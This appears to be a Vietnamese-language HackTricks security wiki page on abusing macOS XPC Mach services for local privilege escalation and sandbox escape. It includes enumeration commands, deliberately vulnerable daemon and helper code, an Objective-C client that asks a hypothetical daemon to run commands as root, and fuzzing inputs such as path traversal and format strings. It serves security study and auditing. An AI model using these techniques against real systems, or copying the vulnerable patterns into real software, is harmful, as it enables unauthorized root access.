# Lạm dụng macOS XPC Mach Services

{{#include ../../../banners/hacktricks-training.md}}

## Thông tin cơ bản

**XPC** (Cross-Process Communication) là cơ chế IPC chính trên macOS. Các daemon hệ thống cung cấp **Mach services** — các cổng có tên được đăng ký với `launchd` — để các tiến trình khác có thể kết nối thông qua `NSXPCConnection`.<sup>[[1]](#references)</sup>

Mỗi plist **LaunchDaemon** và **LaunchAgent** có khóa `MachServices` sẽ đăng ký một hoặc nhiều cổng Mach có tên. Đây là các endpoint XPC trên toàn hệ thống mà mọi tiến trình đều có thể thử kết nối.<sup>[[2]](#references)</sup>

> [!WARNING]
> XPC Mach services là **bề mặt tấn công leo thang đặc quyền cục bộ lớn nhất** trên macOS. Hầu hết các exploit root cục bộ trong những năm gần đây đều khai thác các XPC service dễ bị tấn công trong LaunchDaemon. Mọi method được công khai trong một daemon chạy với quyền root đều có thể là một vector leo thang đặc quyền.

### Kiến trúc

```
Client Process (user context)
    ↓ NSXPCConnection / xpc_connection_create_mach_service()
    ↓ Mach message via launchd
Daemon Process (root context)
    ↓ Receives XPC message
    ↓ (Should verify client identity / entitlements)
    ↓ Performs privileged operation
```

## Liệt kê

### Tìm Daemon có Mach Services

```bash
# Find all LaunchDaemons with MachServices
find /Library/LaunchDaemons /System/Library/LaunchDaemons -name "*.plist" -exec sh -c '
  plutil -p "{}" 2>/dev/null | grep -q "MachServices" && echo "{}"
' \; 2>/dev/null

# List active Mach services
sudo launchctl dumpstate 2>/dev/null | grep -E "name = " | sort -u | head -50

# List all launchd services
launchctl list

# Check a specific daemon's Mach services
plutil -p /Library/LaunchDaemons/com.example.daemon.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged, e.isDaemon
FROM executables e
WHERE e.isDaemon = 1
ORDER BY e.privileged DESC
LIMIT 50;"
```

### Liệt kê các giao diện XPC

Sau khi xác định được một daemon, hãy reverse-engineer giao diện XPC của nó:

```bash
# Find the protocol definition in the binary
strings /path/to/daemon | grep -i "protocol\|interface\|xpc\|method"

# Use class-dump to extract ObjC protocol definitions
class-dump /path/to/daemon | grep -A20 "@protocol"

# Check for XPC service bundles inside app bundles
find /Applications -path "*/XPCServices/*.xpc" 2>/dev/null
```

## Lỗ hổng xác minh XPC client

Loại lỗ hổng phổ biến nhất trong các dịch vụ XPC là **xác minh client không đầy đủ**. Daemon cần xác minh:

1. **Chữ ký mã** của tiến trình kết nối
2. **Entitlement** của tiến trình kết nối
3. **Audit token** (không dùng PID vì PID có thể được tái sử dụng)

### Mẫu dễ bị tổn thương: Không xác minh

```objc
// VULNERABLE — daemon accepts any connection
- (BOOL)listener:(NSXPCListener *)listener
    shouldAcceptNewConnection:(NSXPCConnection *)newConnection {
    newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MyProtocol)];
    newConnection.exportedObject = self;
    [newConnection resume];
    return YES; // No verification!
}
```

### Mẫu dễ bị khai thác: Xác minh dựa trên PID (Race Condition)

```objc
// VULNERABLE — PID can be reused between check and use
- (BOOL)listener:(NSXPCListener *)listener
    shouldAcceptNewConnection:(NSXPCConnection *)newConnection {
    pid_t pid = newConnection.processIdentifier;
    // Attacker can win race: spawn legitimate process → get PID → kill it → exploit process reuses PID
    if ([self isAuthorizedPID:pid]) {
        [newConnection resume];
        return YES;
    }
    return NO;
}
```

### Mẫu hình bảo mật: Xác minh Audit Token

```objc
// SECURE — Uses audit token which cannot be spoofed
- (BOOL)listener:(NSXPCListener *)listener
    shouldAcceptNewConnection:(NSXPCConnection *)newConnection {
    audit_token_t token = newConnection.auditToken;
    
    // Verify code signature via audit token
    SecCodeRef code = NULL;
    NSDictionary *attributes = @{(__bridge NSString *)kSecGuestAttributeAudit: 
        [NSData dataWithBytes:&token length:sizeof(token)]};
    SecCodeCopyGuestWithAttributes(NULL, (__bridge CFDictionaryRef)attributes, 
                                   kSecCSDefaultFlags, &code);
    
    // Verify the signature matches expected signing identity
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(
        CFSTR("identifier \"com.apple.expected\" and anchor apple"), 
        kSecCSDefaultFlags, &requirement);
    
    OSStatus status = SecCodeCheckValidity(code, kSecCSDefaultFlags, requirement);
    if (status == errSecSuccess) {
        [newConnection resume];
        return YES;
    }
    return NO;
}
```

## Tấn công: Kết nối tới các XPC Service không được bảo vệ

```objc
// Minimal XPC client — connect to a LaunchDaemon's Mach service
#import <Foundation/Foundation.h>

@protocol VulnDaemonProtocol
- (void)runCommandAsRoot:(NSString *)command withReply:(void (^)(NSString *))reply;
@end

int main(void) {
    @autoreleasepool {
        NSXPCConnection *conn = [[NSXPCConnection alloc]
            initWithMachServiceName:@"com.example.vulndaemon"
            options:NSXPCConnectionPrivileged];
        
        conn.remoteObjectInterface = [NSXPCInterface 
            interfaceWithProtocol:@protocol(VulnDaemonProtocol)];
        
        [conn resume];
        
        id<VulnDaemonProtocol> proxy = [conn remoteObjectProxyWithErrorHandler:^(NSError *error) {
            NSLog(@"Connection error: %@", error);
        }];
        
        // If the daemon doesn't verify our identity, this works:
        [proxy runCommandAsRoot:@"id" withReply:^(NSString *result) {
            NSLog(@"Result: %@", result);
            // Output: uid=0(root)
        }];
        
        [[NSRunLoop currentRunLoop] run];
    }
}
```

## Tấn công: Giải tuần tự hóa đối tượng XPC

Các dịch vụ XPC chấp nhận các đối tượng phức tạp (tuân thủ `NSSecureCoding`) có thể dễ bị **tấn công giải tuần tự hóa**:

```objc
// If the daemon accepts NSObject subclasses via XPC:
// An attacker can send a crafted object that triggers:
// 1. Type confusion (wrong class instantiated)
// 2. Path traversal (filename objects with ../)
// 3. Format string bugs (string objects as format arguments)
// 4. Integer overflow (large numeric values)
```

## Mach-Lookup Sandbox Exceptions

### Cách các ngoại lệ cho phép thoát khỏi sandbox

Các ứng dụng bị sandbox thường chỉ có thể giao tiếp với các dịch vụ XPC của chính chúng. Tuy nhiên, **mach-lookup exceptions** cho phép truy cập các dịch vụ trên toàn hệ thống:

```xml
<!-- Entitlement granting mach-lookup exception -->
<key>com.apple.security.temporary-exception.mach-lookup.global-name</key>
<array>
    <string>com.apple.system.opendirectoryd.api</string>
    <string>com.apple.SecurityServer</string>
    <string>com.apple.CoreServices.coreservicesd</string>
</array>
```

### Tìm ứng dụng có các ngoại lệ rộng

```bash
# Find sandboxed apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
  binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
  [ -f "$binary" ] && {
    ents=$(codesign -d --entitlements - "$binary" 2>&1)
    echo "$ents" | grep -q "mach-lookup" && {
      echo "=== $(basename "$1") ==="
      echo "$ents" | grep -B1 -A10 "mach-lookup"
    }
  }
' _ {} \; 2>/dev/null
```

### Chuỗi thoát sandbox

```
1. Compromise sandboxed app (e.g., via renderer exploit in browser/email)
2. Enumerate mach-lookup exceptions from entitlements
3. Connect to each reachable system daemon
4. Fuzz the daemon's XPC interface for vulnerabilities
5. Exploit a daemon bug → code execution outside the sandbox
6. Escalate from daemon's privilege level (often root)
```

## Công cụ trợ giúp có đặc quyền (SMJobBless)

### Cách chúng hoạt động

`SMJobBless` cài đặt một helper có đặc quyền chạy với quyền root thông qua launchd. Helper giao tiếp với ứng dụng cha qua XPC:

```
App (user context) ←→ XPC ←→ Helper (root via launchd)
```

### Lỗ hổng phổ biến: Phân quyền yếu

```objc
// Many helpers check authorization but:
// 1. Don't verify WHO is connecting (any process can connect)
// 2. Use rights that any admin can obtain
// 3. Cache authorization decisions

// VULNERABLE helper pattern:
- (void)performPrivilegedAction:(NSString *)action
                  authorization:(NSData *)authData
                      withReply:(void (^)(BOOL))reply {
    AuthorizationRef auth;
    AuthorizationCreateFromExternalForm(
        (AuthorizationExternalForm *)authData.bytes, &auth);
    
    // Only checks if caller has generic admin right
    // But doesn't verify the caller is the app that installed the helper!
    AuthorizationItem item = {kAuthorizationRightExecute, 0, NULL, 0};
    AuthorizationRights rights = {1, &item};
    
    if (AuthorizationCopyRights(auth, &rights, NULL, 
            kAuthorizationFlagDefaults, NULL) == errAuthorizationSuccess) {
        // Performs action as root...
        reply(YES);
    }
}
```

### Khai thác các Helper yếu

```bash
# 1. Find installed privileged helpers
ls /Library/PrivilegedHelperTools/

# 2. Find their LaunchDaemon plists
ls /Library/LaunchDaemons/ | grep -v "com.apple"

# 3. Check the helper's XPC interface
class-dump /Library/PrivilegedHelperTools/com.example.helper | grep -A20 "@protocol"

# 4. Check if the parent app properly verifies connections
strings /Library/PrivilegedHelperTools/com.example.helper | grep -i "codesign\|requirement\|anchor\|audit"
# If no code-signing verification strings → likely vulnerable
```

## XPC Fuzzing

```bash
# Basic XPC fuzzing approach:

# 1. Identify the target service and protocol
plutil -p /Library/LaunchDaemons/com.example.daemon.plist
class-dump /path/to/daemon

# 2. For each exposed method, test:
#    - NULL arguments
#    - Empty strings
#    - Very long strings (buffer overflow)
#    - Path traversal strings (../../etc/passwd)
#    - Format strings (%n%n%n%n)
#    - Integer boundary values (INT_MAX, -1, 0)
#    - Unexpected object types (send NSDictionary where NSString expected)

# 3. Monitor for crashes
log stream --predicate 'process == "daemon-name" AND (eventMessage CONTAINS "crash" OR eventMessage CONTAINS "fault")'
```

## CVE thực tế

| CVE | Mô tả |
|---|---|
| CVE-2023-41993 | Lỗ hổng deserialization của dịch vụ XPC |
| CVE-2022-22616 | Gatekeeper bypass qua việc lạm dụng dịch vụ XPC |
| CVE-2021-30657 | Sysmond XPC privilege escalation |
| CVE-2020-9839 | Race condition XPC trong system daemon |
| CVE-2019-8802 | Công cụ helper có đặc quyền thiếu xác minh client<sup>[[5]](#references)</sup> |
| CVE-2023-32369 | Migraine — SIP bypass thông qua XPC của `systemmigrationd`<sup>[[3]](#references)</sup> |
| CVE-2022-26712 | PackageKit XPC root escalation<sup>[[4]](#references)</sup> |

## Script liệt kê

```bash
#!/bin/bash
echo "=== XPC Mach Services Security Audit ==="

echo -e "\n[*] Third-party privileged helpers:"
for helper in /Library/PrivilegedHelperTools/*; do
  [ -f "$helper" ] || continue
  echo "  $helper"
  codesign -dvv "$helper" 2>&1 | grep "Authority\|TeamIdentifier" | sed 's/^/    /'
done

echo -e "\n[*] Third-party LaunchDaemons with MachServices:"
for plist in /Library/LaunchDaemons/*.plist; do
  plutil -p "$plist" 2>/dev/null | grep -q "MachServices" && {
    echo "  $plist"
    plutil -p "$plist" | grep -A5 "MachServices" | sed 's/^/    /'
  }
done

echo -e "\n[*] User LaunchAgents with MachServices:"
for plist in ~/Library/LaunchAgents/*.plist; do
  plutil -p "$plist" 2>/dev/null | grep -q "MachServices" && {
    echo "  $plist"
    plutil -p "$plist" | grep -A5 "MachServices" | sed 's/^/    /'
  }
done
```

## References

- [1] [Apple Developer — Dịch vụ XPC](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html)
- [2] [Apple Developer — Hướng dẫn lập trình Daemon và dịch vụ](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/Introduction.html)
- [3] [Lỗ hổng macOS mới, Migraine, có thể vượt qua System Integrity Protection — Microsoft Security Blog](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [4] [CVE-2022-26712: POC để bypass SIP thậm chí có thể đăng trong một tweet](https://jhftss.github.io/CVE-2022-26712-The-POC-For-SIP-Bypass-Is-Even-Tweetable/)
- [5] [Objective-See — Xác thực client XPC và Rootpipe](https://objective-see.org/blog/blog_0x3E.html)
{{#include ../../../banners/hacktricks-training.md}}
